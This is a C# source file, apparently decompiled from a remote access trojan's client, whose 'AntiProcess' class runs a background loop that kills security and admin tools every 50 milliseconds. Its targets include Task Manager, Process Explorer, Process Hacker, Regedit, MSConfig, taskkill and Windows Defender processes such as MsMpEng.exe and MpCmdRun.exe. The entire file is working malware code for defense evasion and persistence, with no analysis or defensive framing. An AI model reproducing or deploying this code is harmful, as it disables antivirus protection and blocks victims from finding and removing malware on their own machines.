using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading;

namespace Client.Helper;

public static class AntiProcess
{
	private static Thread BlockThread = new Thread(Block);

	public static bool Enabled { get; set; }

	public static void StartBlock()
	{
		Enabled = true;
		BlockThread.Start();
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void StopBlock()
	{
		Enabled = false;
		try
		{
			BlockThread.Abort();
			BlockThread = new Thread(Block);
		}
		catch
		{
		}
	}

	private static void Block()
	{
		while (Enabled)
		{
			IntPtr intPtr = CreateToolhelp32Snapshot(2u, 0u);
			PROCESSENTRY32 lppe = default(PROCESSENTRY32);
			lppe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
			if (Process32First(intPtr, ref lppe))
			{
				do
				{
					uint th32ProcessID = lppe.th32ProcessID;
					string szExeFile = lppe.szExeFile;
					if (Matches(szExeFile, "Taskmgr.exe") || Matches(szExeFile, "ProcessHacker.exe") || Matches(szExeFile, "procexp.exe") || Matches(szExeFile, "MSASCui.exe") || Matches(szExeFile, "MsMpEng.exe") || Matches(szExeFile, "MpUXSrv.exe") || Matches(szExeFile, "MpCmdRun.exe") || Matches(szExeFile, "NisSrv.exe") || Matches(szExeFile, "ConfigSecurityPolicy.exe") || Matches(szExeFile, "MSConfig.exe") || Matches(szExeFile, "Regedit.exe") || Matches(szExeFile, "UserAccountControlSettings.exe") || Matches(szExeFile, "taskkill.exe"))
					{
						KillProcess(th32ProcessID);
					}
				}
				while (Process32Next(intPtr, ref lppe));
			}
			CloseHandle(intPtr);
			Thread.Sleep(50);
		}
	}

	private static bool Matches(string source, string target)
	{
		return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
	}

	private static void KillProcess(uint processId)
	{
		IntPtr intPtr = OpenProcess(1u, bInheritHandle: false, processId);
		TerminateProcess(intPtr, 0);
		CloseHandle(intPtr);
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

	[DllImport("kernel32.dll")]
	private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

	[DllImport("kernel32.dll")]
	private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(IntPtr handle);

	[DllImport("kernel32.dll")]
	private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);
}
